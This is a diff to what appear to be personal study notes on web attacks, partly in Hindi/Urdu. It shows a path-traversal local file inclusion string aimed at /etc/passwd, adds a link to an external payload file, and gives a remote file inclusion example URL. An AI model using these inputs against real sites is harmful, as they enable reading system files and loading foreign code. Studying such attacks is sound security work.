@@ -12,5 +12,9 @@ system configuration file by going root directory (/.bashrc)
 /etc/passwd
 any.com/index.php?file=../../../etc/passwd
 
+LFT payload (https://drive.google.com/file/d/1mjvLqbkYEH2FYWFHS_F34aTQfHjYMzMh/view?usp=sharing)
 
+RFI(remote File Inclusion )
+dusra website a Containt load kar na 
+ex:- http://example.com/admin/index.php?page=http://example.com/exam.html 
 
